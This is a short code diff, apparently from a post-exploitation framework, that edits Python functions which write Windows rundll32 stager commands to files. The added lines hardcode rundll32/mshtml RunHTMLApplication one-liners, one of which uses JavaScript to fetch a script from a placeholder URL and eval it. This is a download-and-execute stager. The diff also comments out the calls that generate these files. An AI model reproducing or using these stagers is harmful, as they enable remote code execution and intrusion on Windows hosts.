@@ -61,6 +61,8 @@ def pay_no_attention():
     command += " "
     command += "RunHTMLApplication"
 
+    command = "rundll32.exe ~URL~\\..\\..\\..\\mshtml,RunHTMLApplication"
+
     with open('data/stager/js/rundll32/rundll32.cmd', 'w') as f:
         f.write(command+"\n")
 
@@ -108,6 +110,8 @@ def seriously_nothing_shady_here():
     command += " "
     command += "RunHTMLApplication \";x=new%20ActiveXObject(\"Msxml2.ServerXMLHTTP.6.0\");x.open(\"GET\",\"~URL~\",false);x.send();eval(x.responseText);window.close();"
 
+    command = """rundll32.exe javascript:"\\..\\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","~URL~",false);x.send();eval(x.responseText);window.close();"""
+
     with open('data/stager/js/rundll32_js/rundll32_js.cmd', 'w') as f:
         f.write(command+"\n")
 
@@ -134,8 +138,8 @@ if __name__ == "__main__":
     else:
         banner = open("data/banner.txt", "rb").read().decode("unicode_escape")
 
-    pay_no_attention()
-    seriously_nothing_shady_here()
+    # pay_no_attention()
+    # seriously_nothing_shady_here()
 
     shell = core.shell.Shell(banner, __version__)
     shell.run(autorun, restore)
